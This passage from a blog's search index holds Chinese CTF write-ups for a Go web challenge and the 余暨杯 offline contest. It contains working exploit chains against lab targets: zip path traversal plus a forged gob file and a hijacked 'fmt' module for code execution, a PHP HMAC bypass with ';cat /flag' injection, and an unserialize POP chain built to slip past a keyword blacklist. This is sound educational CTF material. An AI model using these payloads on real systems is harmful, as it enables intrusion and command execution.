class="string">&quot;failed to unzip file&quot;</span>&#125;)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        fileutil.RemoveFile(userUploadDir + file)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后因为下面这段代码，所以可以知道，解压路径是可控的，即利用..就可以达到访问任意目录的目的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">destPath := filepath.Clean(userUploadDir + c.Query(<span class="string">&quot;path&quot;</span>))</span><br></pre></td></tr></table></figure><p>然后是最后一个路由/backdoor。后门路由</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">r.GET(<span class="string">&quot;/backdoor&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    session := sessions.Default(c)</span><br><span class="line">    <span class="keyword">if</span> session.Get(<span class="string">&quot;shallow&quot;</span>) == <span class="literal">nil</span> &#123;</span><br><span class="line">        c.Redirect(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    userDir := session.Get(<span class="string">&quot;shallow&quot;</span>).(<span class="type">string</span>)</span><br><span class="line">    <span class="keyword">if</span> fileutil.IsExist(userDir + <span class="string">&quot;user.gob&quot;</span>) &#123;</span><br><span class="line">        file, _ := os.Open(userDir + <span class="string">&quot;user.gob&quot;</span>)</span><br><span class="line">        decoder := gob.NewDecoder(file)</span><br><span class="line">        <span class="keyword">var</span> ctfer User</span><br><span class="line">        decoder.Decode(&amp;ctfer)</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="keyword">if</span> ctfer.Power == <span class="string">&quot;admin&quot;</span> &#123; <span class="comment">//</span></span><br><span class="line">            eval, err := goeval.Eval(<span class="string">&quot;&quot;</span>, <span class="string">&quot;fmt.Println(\&quot;Good\&quot;)&quot;</span>, c.DefaultQuery(<span class="string">&quot;pkg&quot;</span>, <span class="string">&quot;fmt&quot;</span>))</span><br><span class="line">            <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">                fmt.Println(err)</span><br><span class="line">            &#125;</span><br><span class="line">            c.HTML(<span class="number">200</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="type">string</span>(eval)&#125;)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            c.HTML(<span class="number">200</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;low power&quot;</span>&#125;)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        c.HTML(<span class="number">500</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;no such user gob&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这里面主要是两点，ctfer.Power == “admin”这个判断，以及eval方法的利用。</p><ul><li>ctfer.Power == “admin”很显然要利用前面文件上传，达到上传一个user.gob并且替换序列化对象中的Power的值。而这个题目由于有个/unzip因此我们可以上传一个压缩包，直接然后利用解压把文件放到我们想要的任何位置。修改的代码如下</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/gob&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">Name  <span class="type">string</span></span><br><span class="line">Path  <span class="type">string</span></span><br><span class="line">Power <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">userDir := <span class="string">&quot;&quot;</span></span><br><span class="line">os.Create(userDir + <span class="string">&quot;user.gob&quot;</span>)</span><br><span class="line">gobFile, _ := os.Create(userDir + <span class="string">&quot;user.gob&quot;</span>) <span class="comment">// 创建文件 /tmp/4b997ad5487153fba0162e525abd6b7d/user.gob</span></span><br><span class="line">user := User&#123;Name: <span class="string">&quot;ctfer&quot;</span>, Path: userDir, Power: <span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line">encoder := gob.NewEncoder(gobFile)</span><br><span class="line">encoder.Encode(user)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后把user.gob压缩一下，上传上去</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230223175051058.png" alt="image-20230223175051058"></p><p>然后访问即可/unzip?path=../</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230223175241163.png" alt="image-20230223175241163"></p><ul><li>然后是eval方法利用</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval, err := goeval.Eval(<span class="string">&quot;&quot;</span>, <span class="string">&quot;fmt.Println(\&quot;Good\&quot;)&quot;</span>, c.DefaultQuery(<span class="string">&quot;pkg&quot;</span>, <span class="string">&quot;fmt&quot;</span>))</span><br></pre></td></tr></table></figure><p>很明显，内容是不可控的，但是有一个点，调用的函数内容我们是可控的。</p><p>因为没有规定这个fmt一定是原本库里面的fmt，我们可以直接自己上传一个fmt去令其执行我们想要的代码。</p><p>因此可以自己写一个fmt模块</p><p>例如 RCE/fmt</p><p>目录结构如下:</p><p>RCE</p><p>​    fmt</p><p>​        –fmt.go</p><p>​        –go.mod</p><p>操作在fmt文件夹下面调用go mod init fmt</p><p>然后go.mod里面内容如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">module fmt</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="number">1.19</span></span><br><span class="line"></span><br><span class="line">require RCE/fmt v0<span class="number">.0</span><span class="number">.0</span></span><br><span class="line">replace RCE/fmt v0<span class="number">.0</span><span class="number">.0</span> =&gt; ../fmt</span><br></pre></td></tr></table></figure><p>fmt.go里面内容</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> fmt</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;os/exec&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Println</span><span class="params">(cmd <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">out, _ := exec.Command(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;/ffflllaaaggg&quot;</span>).Output()</span><br><span class="line"><span class="comment">// out, _ := exec.Command(&quot;whoami&quot;).Output()</span></span><br><span class="line">fmt.Println(<span class="type">string</span>(out))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// /usr/local/go/src/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后把文件内容放到/usr/local/go/src/目录下面就可以了</p><p><img src="https://gitee.com/fpointzero/imgforit/raw/master/img/image-20230223180503199.png" alt="image-20230223180503199"></p><p>然后访问backdoor就可以得到flag</p>]]></content>
      
      
      <categories>
          
          <category> 复现赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>余暨杯线下赛</title>
      <link href="/2022/11/22/%E4%BD%99%E6%9A%A8%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B/"/>
      <url>/2022/11/22/%E4%BD%99%E6%9A%A8%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="huluwa"><a href="#huluwa" class="headerlink" title="huluwa"></a>huluwa</h3><p>音频末尾有源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Huluxiaojinggang&#x27;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Shejing&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$secret</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;secret&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;yeye&#x27;</span>]))</span><br><span class="line">    <span class="variable">$secret</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;yeye&#x27;</span>], <span class="variable">$secret</span>);</span><br><span class="line"><span class="variable">$qwer</span> = <span class="title function_ invoke__">hash_hmac</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;Shejing&#x27;</span>], <span class="variable">$secret</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$qwer</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$qwer</span> !== <span class="variable">$_POST</span>[<span class="string">&#x27;Huluxiaojinggang&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;2&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="string">&quot;nc&quot;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;Shejing&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>利用数组报错使得secret=null然后就可以利用函数获得$qwer里面的内容。</p><p>所以最终payload：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yeye[]=1&amp;Huluxiaojinggang=c7e4698914f5d06bf59a9b3b081046f261170deb991ca94e9c2ddfafe928560a&amp;Shejing=;cat /flag</span><br></pre></td></tr></table></figure><h3 id="php-levels"><a href="#php-levels" class="headerlink" title="php-levels"></a>php-levels</h3><p>首先采用php伪协议读取了hint.php文件里面内容</p><p><img src="https://gitee.com/fpointzero/image-repo/raw/master/img/1668932265719.png" alt="1668932265719"></p><p>事实上这个能出来纯属巧合，原本能绕过的payload应当是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/usr/share/nginx/html/hint.php</span></span><br></pre></td></tr></table></figure><p>然后进行base64解码得到了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mouse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rice</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$n</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;rice-&gt;<span class="title function_ invoke__">nothing</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;chance?&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fish</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;fish-&gt;d))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;you wrong&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">get</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$no</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pop</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sys|pas|read|file|ls|cat|tac|head|tail|more|less|base|echo|cp|\$|\*|\+|\^|scan|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i&#x27;</span>,<span class="variable">$pop</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you will get flag&quot;</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$pop</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Try again!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是一个php链条</p><p>从dog-&gt;ct-&gt;mouse-&gt;get</p><p>构造payload绕过正则</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mouse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rice</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;rice = <span class="keyword">new</span> get;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;chance?&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = &amp;<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="keyword">new</span> ct;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fish</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fish = <span class="keyword">new</span> mouse;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">get</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&#x27;print(`c\at /realflag/you_want_flag.php`);&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> dog;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:3:&quot;dog&quot;:3:&#123;s:1:&quot;a&quot;;s:7:&quot;chance?&quot;;s:1:&quot;b&quot;;R:2;s:1:&quot;c&quot;;O:2:&quot;ct&quot;:1:&#123;s:4:&quot;fish&quot;;O:5:&quot;mouse&quot;:1:&#123;s:4:&quot;rice&quot;;O:3:&quot;get&quot;:1:&#123;s:3:&quot;cmd&quot;;s:42:&quot;print(`c\at /realflag/you_want_flag.php`);&quot;;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/fpointzero/image-repo/raw/master/img/1668932556210.png" alt="1668932556210"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c91d38f0-86ea-4f36-b4d8-5e6a716ea8fe&#125;</span><br></pre></td></tr></table></figure><p>另外一种构造是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;cmd = <span class="string">&#x27;?&gt;&lt;?=`nl</span></span><br><span class="line"><span class="string">/realflag/you_want_flag.php`;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>用这?&gt;&lt;?替代了echo的作用</p>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
